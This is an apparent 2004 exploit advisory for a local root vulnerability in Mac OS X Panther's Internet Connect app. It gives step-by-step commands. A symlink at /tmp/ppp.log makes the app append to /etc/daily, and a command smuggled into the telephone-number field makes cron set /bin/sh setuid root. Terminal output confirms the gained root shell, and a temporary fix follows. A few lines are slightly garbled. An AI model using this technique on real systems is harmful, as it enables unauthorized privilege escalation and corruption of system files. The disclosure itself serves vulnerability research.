Mac OS X Panther Internet Connect Local Root Exploit
====================================================


Date: 25.07.2004
Author: B-r00t. 2004.
Email: B-r00t <br00t blueyonder co uk>

Vendor: Apple

Operating
System: OSX Panther (Possibly Previous Versions).

Application: Internet Connect.app

Tested: Panther 10.3.4 (Internet Connect v1.3)

Problem: Internet Connect allows any file on the file
system to be altered.

Status: 0day! - Temporary Fix Included.

Description:
Apples Internet Connect application creates a
&#039;ppp.log&#039; file in &#039;/tmp/&#039;. If the file already
exists it is opened in append mode. If it does
not exist a new file is created.

It is possible to trick Internet Connect into
appending data to any file on the filesystem by
creating a symlink file &#039;/tmp/ppp.log&#039; pointing
to the file to be altered.

If the file &#039;/tmp/ppp.log&#039; already exists, the
attack is not possible as the file is owned by
user &#039;root&#039; and group &#039;wheel&#039;: -

$ ls -l /tmp/ppp.log
-rw-r--r-- 1 root wheel 807 24 Jul 23:44 /tmp/ppp.log

However, due to the Operating System clearing the
&#039;/tmp&#039; directory during system startup and also on
a regular basis due to system maintenance, it
becomes possible to form the attack as shown below:

owned and only writable by user &#039;root&#039;.

maki:~ # echo "TEST" > /etc/file_owned_by_root

maki:~ # ls -l /etc/file_owned_by_root
-rw-r--r-- 1 root wheel 5 25 Jul 00:09 /etc/
file_owned_by_root

maki:~ # cat /etc/file_owned_by_root
TEST

A symlink is now created in the &#039;/tmp&#039; directory to
point to the file to be altered. It is important to
realise that the link can be created as a none &#039;admin&#039;
or &#039;root&#039; user.

maki:/tmp $ id
uid=502(br00t) gid=502(br00t) groups=502(br00t)

maki:/tmp $ ln -s /etc/file_owned_by_root ppp.log

maki:/tmp $ ls -l ./ppp.log
lrwxr-xr-x 1 root wheel 23 25 Jul 00:11 ./ppp.log@ -> /
etc/file_owned_by_root

Now Internet Connect is opened. Under &#039;configuration&#039;
choose &#039;Other&#039;. Enter some text into the &#039;Telephone
Number&#039; box (B-r00t r0x y3r w0rld!) and click &#039;Connect&#039;.

&#039;Cancel&#039; can be clicked several seconds later.

Checking the original file &#039;/etc/file_owned_by_root&#039;
we see the following: -

maki:~ $ cat /etc/file_owned_by_root
TEST
Sun Jul 25 00:20:42 2004 : Version 2.0
Sun Jul 25 00:20:43 2004 : Dialing B-r00t r0x y3r w0rld!
Sun Jul 25 00:20:54 2004 : Terminating on signal 15.
Sun Jul 25 00:20:58 2004 : Serial link disconnected.

As can be seen, data has been appended to the &#039;protected&#039;
file.

Impact: It is possible for a local user to escalate their
privileges by appending data to specific system files.
In addition, a malicious user may be able to render the
machine unusable by corrupting important system files.

Exploit: This demonstration appends commands to the &#039;/etc/daily&#039;
file which is executed by default at 3:15AM each day.
An alternative attack might involve appending to any
of the files that are sourced at system start up such
as &#039;/etc/rc.common&#039;. This latter method is convenient
if the user is able to reboot the machine.

Create our link
maki:~ $ ln -s /etc/daily /tmp/ppp.log

Open Internet Connect.
Internal Modem -> Configuration -> Other

Internet Connect only allows certain characters to be
used for the telephone number. The background &#039;&&#039;
character allows our command string to execute amongst
the time and date strings also appended.

Telephone Number:
& cd .. && cd .. && cd .. && cd .. && cd bin && chmod 4755 
sh &

Click &#039;Connect&#039; ...*wait (10secs) ... &#039;Cancel&#039;

Check the &#039;/etc/daily&#039; file.
maki:~ $ tail /etc/daily
if [ -f /etc/security ]; then
echo ""
echo "Running security:"
sh /etc/security 2>&1 | sendmail root
fi

Sun Jul 25 03:10:11 2004 : Version 2.0
Sun Jul 25 03:10:11 2004 : Dialing & cd .. && cd .. && cd .. 
&& cd .. && cd bin && chmod 4755 sh &
Sun Jul 25 03:10:15 2004 : Terminating on signal 15.
Sun Jul 25 03:10:17 2004 : Serial link disconnected.

Now sit back and wait for cron to execute &#039;/etc/daily&#039; at 03:
15AM.

maki:~ $ date
Sun Jul 25 03:13:43 CEST 2004

maki:~ $ cd /bin

maki:/bin $ ls -l sh
-r-xr-xr-x 1 root wheel 603488 25 Jun 09:39 sh*

maki:/bin $ date
Sun Jul 25 03:15:50 CEST 2004

maki:/bin $ ls -l sh
-rwsr-xr-x 1 root wheel 603488 25 Jun 09:39 sh*

maki:/bin $ sh

maki:/bin # id
uid=502(br00t) euid=0(root) gid=502(br00t) 
groups=502(br00t)

All thats left to do is clean up &#039;/etc/daily&#039; and remove the 
link
&#039;/tmp/ppp.log&#039; 

FIX: The following commands serve to provide a temporary fix 
until
Apple release an official update.

Open a terminal: /Applications/Utilities/Terminal.app
Gain root access using &#039;sudo&#039;:

maki:~ $ sudo sh
Password:[YOUR PASSWORD]

maki:~ # whoami
root

You can copy and paste the following commands: -

/usr/bin/touch /tmp/ppp.log
echo &#039;/usr/bin/touch /tmp/ppp.log&#039; >> /etc/daily
echo &#039;/usr/bin/touch /tmp/ppp.log&#039; >> /etc/rc.common

These commands ensure that a &#039;/tmp/ppp.log&#039; file is
above. Alternatively the line:

/usr/bin/touch /tmp/ppp.log

can be added to each file &#039;/etc/daily&#039; and &#039;/etc/rc.common&#039;
manually using an editor and root privileges.

Shoutz: Marshal-L, Ruxsaw, Haggis & Kraft.
s1, Blex & the old #cheese posse (RIP).
Maz ... Good Luck For The Wedding!



